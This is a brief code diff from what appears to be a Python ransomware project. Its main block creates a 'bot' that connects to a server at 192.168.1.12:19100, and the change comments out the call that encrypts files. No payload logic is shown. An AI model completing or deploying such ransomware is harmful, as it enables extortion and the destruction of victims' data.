@@ -42,4 +42,4 @@ class Ransomware:
 if __name__ == '__main__':
     bot = Ransomware('192.168.1.12', 19100)
     bot.ConnectServer()
-    bot.Encrypted()
+    #bot.Encrypted()
